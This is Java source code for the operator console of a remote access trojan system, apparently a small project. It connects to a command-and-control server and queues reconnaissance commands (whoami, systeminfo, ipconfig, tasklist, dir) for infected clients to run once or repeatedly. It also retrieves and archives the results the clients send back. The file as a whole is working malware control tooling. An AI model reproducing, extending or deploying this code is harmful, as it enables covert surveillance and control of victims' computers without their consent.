import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.RandomAccessFile;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

import java.net.Socket;

import java.sql.Date;
import java.text.SimpleDateFormat;

import AES.AESInput;
import AES.Driver;


/**
 * Code to server as the Operator for the RATs. Connects to the server and 
 * allows for viewing and adding new commands as well as retrieving data sent
 * from the clients.
 * 
 * @author Hassam Tariq
 * @author Aidan Sprague
 * @version 06.11.2021
 */
public class Operator {

    // Operator data fields:
    private static Socket socket;
    private static BufferedReader in;
    private static PrintWriter out;
    private static String key;
    private static SimpleDateFormat formatter;

    /**
     * Creates a new Operator object. This will create and store the data
     * required for establishing an Operator connection to the server.
     * 
     * @param address   the IP address of the server
     * @param port      the open port to connect on
     */
    public Operator(String address, int port) throws Exception {

        // Establish a connection to the IP address over the given port
        socket = new Socket(address, port);

        // Create I/O buffers
        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);
        
        // Open and store the key
        RandomAccessFile keyFile = new RandomAccessFile("../Data/accesskey.txt", "r");
        key = keyFile.readLine();
        keyFile.close(); 

        // Create the date formatter
        formatter = new SimpleDateFormat("yyyy-MM-dd'_'HHmmss");
    }

    /**
     * Creates an Operator object and stablishes a connection to the server.
     */
    public static void main(String[] args) {

        // Validate command line arguments
        if (args.length != 2) {

            System.out.println("Invocation: java Operator <IP Address> <Port>");
            System.exit(1);
        }

        try {
            // Show startup screen
            clearScreen();
            System.out.println("   _____ _ _            _      _____                            _                   __   ___  \n"
                + "  / ____| (_)          | |    / ____|                          | |                 /_ | / _ \\ \n"
                + " | |    | |_  ___ _ __ | |_  | |     ___  _ __  _ __   ___  ___| |_ ___ _ __  __   _| || | | |\n"
                + " | |    | | |/ _ \\ '_ \\| __| | |    / _ \\| '_ \\| '_ \\ / _ \\/ __| __/ _ \\ '__| \\ \\ / / || | | |\n"
                + " | |____| | |  __/ | | | |_  | |___| (_) | | | | | | |  __/ (__| ||  __/ |     \\ V /| || |_| |\n"
                + "  \\_____|_|_|\\___|_| |_|\\__|  \\_____\\___/|_| |_|_| |_|\\___|\\___|\\__\\___|_|      \\_/ |_(_)___/ \n");
            System.out.println("----------------------------------------------------------------------------------------------");
            System.out.print("[ Establishing connection .");

            // Create an Operator object
            new Operator(args[0], Integer.parseInt(args[1]));
            System.out.print(".");

            // Listen and check for connection confirmation
            String result = receiveDecrypted();
            System.out.print(". ");
            if (result == null || !result.equals("200 Connected")) {
                System.out.println("Error connecting ]");
                System.out.println("Terminating program ...");
                in.close();
                out.close();
                socket.close();
                System.exit(2);
            }

            System.out.println("Connected ]");

            // Send key and check validation
            System.out.print("[ Sending validation key .");
            sendEncrypted(key);
            System.out.print(".");
            result = receiveDecrypted();
            System.out.print(". ");
            if (result == null || !result.equals("200 Key Accepted")) {
                System.out.println("Key rejected ]");
                System.out.println("[ Terminating program ... Terminated ]");
                in.close();
                out.close();
                socket.close();
                System.exit(3);
            }

            System.out.println("Key accepted ]\n");
            Scanner userInput = new Scanner(System.in);

            // Create a list of allowed commands
            ArrayList<String> listCommand = new ArrayList<>(Arrays.asList(
                "dir",
                "systeminfo", 
                "whoami", 
                "ipconfig", 
                "ipconfig /all",
                "tasklist"
            ));

            // Loop until user quits
            printMenu();
            while (true) {

                System.out.print("> ");
                String decision = userInput.nextLine();
                System.out.println("");

                switch (decision) {
                    case "Quit":
                    case "quit":
                    case "QUIT":
                    case "q":
                    case "Q":
                    case "0":
                        // Quit
                        sendEncrypted(decision);
                        System.out.println("[ Terminating program ... Terminated ]");

                        userInput.close();
                        in.close();
                        out.close();
                        socket.close();

                        System.exit(0);

                    case "1":
                    case "4":
                        // Queue commands, Add repeat commands
                        sendEncrypted(decision);
                        result = receiveDecrypted();
                        if (result == null || !result.equals("200 Ready to receive")) {
                            System.out.println(result + "\n");
                            continue;
                        }

                        System.out.print("Enter commands one at a time followed by"
                            + " <Enter> (type 'list' for valid cmds, 'quit' to stop):\n\n> ");
                        StringBuilder cmdList = new StringBuilder();
                        decision = userInput.nextLine();

                        while (decision != null && !decision.equals("quit") && !decision.equals("q")) {
                            
                            if (decision.equals("list") || decision.equals("l")) {
                                System.out.println("\nValid Commands:");
                                System.out.println("  - dir                get directory contents");
                                System.out.println("  - systeminfo         get basic system info");
                                System.out.println("  - whoami             get privilege status");
                                System.out.println("  - ipconfig [/all]    get connection info");
                                System.out.println("  - tasklist           get running processes\n");
                            }
                            else if (!listCommand.contains(decision))
                                System.out.println("\nInvalid command. Type 'list' for help or 'quit' to stop.\n");
                            else 
                                cmdList.append(decision + "|");
                                
                            System.out.print("> ");
                            decision = userInput.nextLine();
                        }

                        if (cmdList.toString() == null || cmdList.toString().length() == 0) {
                            System.out.println("\nNo commands entered.\n");
                            sendEncrypted("");
                            receiveDecrypted();
                            continue;
                        }

                        System.out.print("\n[ Sending .");
                        sendEncrypted(cmdList.toString());
                        System.out.print(".");
                        result = receiveDecrypted();
                        System.out.print(". ");
                        if (result == null || !result.equals("200 Commands received")) {
                            System.out.println(result + " ]\n");
                            continue;
                        }

                        System.out.println("Sent ]\n");

                        break;
                    case "2":
                    case "5":
                        // View command queue, View repeat commands
                        sendEncrypted(decision);
                        result = receiveDecrypted();
                        if (result == null) {
                            System.out.println("Error receiving data\n");
                            continue;
                        }

                        System.out.println(result + "\n");

                        break;
                    case "3":
                    case "6":
                        // Clear command queue, Delete repeat commands
                        sendEncrypted(decision);
                        result = receiveDecrypted();
                        if (result == null) {
                            System.out.println("Error clearing commands\n");
                            continue;
                        }
                        if (result.equals("205 Queue Empty")) {
                            System.out.println("Queue is already empty.\n");
                            continue;
                        }

                        System.out.print("WARNING: Action is irreversible. Type 'DELETE' to confirm.\n\n> ");
                        decision = userInput.nextLine();

                        if (decision == null || !decision.toUpperCase().equals("DELETE")) 
                            System.out.println("\nInvalid input. Cancelling command.\n");
                        
                        else {
                            sendEncrypted("true");
                            result = receiveDecrypted();
                            if (result == null || !result.equals("200 Commands Cleared")) {
                                System.out.println("Error clearing commands\n");
                                continue;
                            }

                            System.out.println("\nCommands cleared.\n");
                        }

                        break;
                    case "7":
                        // Get new results
                        sendEncrypted(decision);
                        result = receiveDecrypted();
                        if (result == null) {
                            System.out.println("Error receiving recent results\n");
                            continue;
                        }

                        String recent = result.replace("\"", "");
                        recent = recent.replaceAll("\\\\n","\n");
                        recent = recent.replaceAll("\\\\r","\r");
                        System.out.println(recent + "\n");

                        break;
                    case "8":
                        // Get old results
                        System.out.print("[ Downloading ");
                        sendEncrypted(decision);
                        System.out.print(".");
                        result = receiveDecrypted();
                        if (result == null) {
                            System.out.println("... Error downloading results ]\n");
                            continue;
                        }

                        System.out.print(".");
                        String archive = result.replace("\"", "");
                        archive = archive.replaceAll("\\\\n","\n");
                        archive = archive.replaceAll("\\\\r","\r");
                        System.out.println(". Downloaded ]");

                        String fileName = "../Data/" + getTime() + "_results.txt";
                        RandomAccessFile file = new RandomAccessFile(fileName, "rw");
                        file.writeBytes(archive);
                        System.out.println("See file <" + fileName + "> for results.\n");
                        file.close();
                        
                        break;
                    case "9":
                        // Client info
                        System.out.println("Command not yet implemented.\n");

                        break;
                    case "help":
                    case "Help":
                    case "HELP":
                    case "h":
                    case "H":
                    case "10":
                        // Help
                        System.out.println("  - (0)  Quit:                    Kills the connection and terminates the program.\n"
                                         + "  - (1)  Queue Cmds:              Adds commands to a queue for the client to execute\n"
                                         + "                                     upon its next awakening.\n"
                                         + "  - (2)  View Cmd Queue:          View the commands queued for the client.\n"
                                         + "  - (3)  Delete Cmd Queue:        Delete the commands queued for the client.\n"
                                         + "  - (4)  Add Repeat Cmds:         Adds commands to be executed everytime the client\n"
                                         + "                                     awakens (along with any in the queue).\n"
                                         + "  - (5)  View Repeat Cmds:        View the set repeated commands.\n"
                                         + "  - (6)  Delete Repeat Cmds:      Delete the set repeated commands.\n"
                                         + "  - (7)  Get New Results:         View the most recent results sent from the client.\n"
                                         + "  - (8)  Download Old Results:    Download all previous results sent from the client.\n"
                                         + "  - (9)  Client Info:             View the general info about the client (i.e. IP, \n"
                                         + "                                     lifetime, kill time, next awakening, etc)\n"
                                         + "  - (10) Help:                    View the help menu.\n");

                        break;
                    case "clear":
                    case "Clear":
                    case "CLEAR":
                        // Clear the screen
                        clearScreen();

                        break;
                    default:
                        // Invalid
                        System.out.println("Invalid decision. Enter 'help' for help, 'quit' to quit.\n");
                }
            }
        }
        catch (Exception e) {
            System.out.println("\n[ ERROR: " + e.getMessage() + "]");
            System.out.println("[ Terminating program ... Terminated ]");
        }
    }

    /**
     * Clears the console window and resets cursor.
     */
    private static void clearScreen() {  
        System.out.println(new String(new char[50]).replace("\0", "\r\n"));  
    }

    /**
     * Prints the menu to the screen.
     */
    private static void printMenu() {
        System.out.println("Menu Options:");
        System.out.println("  0: Quit | 1: Queue Cmds | 2: View Cmd Queue | 3: Delete Cmd Queue");
        System.out.println("  4: Add Repeat Cmds | 5: View Repeat Cmds | 6: Delete Repeat Cmds");
        System.out.println("  7: Get New Results | 8: Download Old Results | 9: Client Info | 10: Help\n");
    }

    /**
     * Returns a String representation of the current system time, of the form:
     * 
     *  [yyyy-MM-dd HH:mm:ss]
     */
    private static String getTime() {
        Date date = new Date(System.currentTimeMillis());
        return formatter.format(date);
    }

    /**
     * Encrypts input before being sent to the operator.
     * 
     * @param str   the string to encrypt and send
     */
    private static void sendEncrypted(String str) {
        //AESInput input = new AESInput(str, key, true);
        //String encrypted = Driver.run(input);
        //out.println(encrypted);
        out.println(str);
    }

    /**
     * Receives and decrypts a message from the operator.
     * 
     * @return a decrypted string from the operator
     */
    private static String receiveDecrypted() throws Exception {
        //String encrypted = in.readLine();
        //AESInput input = new AESInput(encrypted, key, false);
        //return Driver.run(input);
        return in.readLine();
    }
}
